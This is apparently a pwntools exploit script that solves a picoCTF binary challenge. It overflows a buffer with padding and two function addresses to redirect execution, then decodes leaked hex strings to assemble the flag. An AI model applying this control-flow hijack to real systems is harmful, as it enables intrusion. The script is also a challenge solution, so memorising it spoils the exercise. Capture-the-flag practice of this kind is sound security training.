from pwn import *

HOST, PORT = 'saturn.picoctf.net', 65080
r = remote(HOST, PORT)
# r = process('./vuln')

win = 0x8049d90
print_flag = 0x8049e10
r.sendline(b'A' * 14 + p32(win) + p32(print_flag))
r.recvuntil('0x804007d ')
last = r.recvline().decode().strip().split()

r.recvuntil('Names of user: ')
middle = r.recvline().decode().strip().split()

r.recvuntil('Age of user: ')
first = r.recvline().decode().strip()[2:]

print(bytes.fromhex(first).decode()[::-1], end='')
for x in middle[::-1]:
    print(bytes.fromhex(x[2:]).decode()[::-1], end='')
for x in last[::-1]:
    print(bytes.fromhex(x[2:]).decode()[::-1], end='')
print('}')

r.interactive()